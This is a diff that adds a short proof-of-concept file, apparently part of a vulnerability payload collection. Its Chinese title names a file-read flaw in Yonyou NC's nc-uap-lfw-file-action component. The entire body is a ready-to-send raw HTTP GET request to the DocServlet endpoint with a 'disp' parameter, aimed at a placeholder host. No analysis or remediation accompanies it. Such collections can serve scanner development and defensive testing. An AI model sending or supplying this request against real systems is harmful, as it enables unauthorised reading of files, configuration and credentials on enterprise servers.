@@ -1,0 +1,9 @@
+# 用友NC nc-uap-lfw-file-action 文件读取漏洞
+GET /servlet/~webrt/nc.uap.lfw.file.action.DocServlet?disp=hack.xml HTTP/1.1
+Host: www.testrule.com:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+
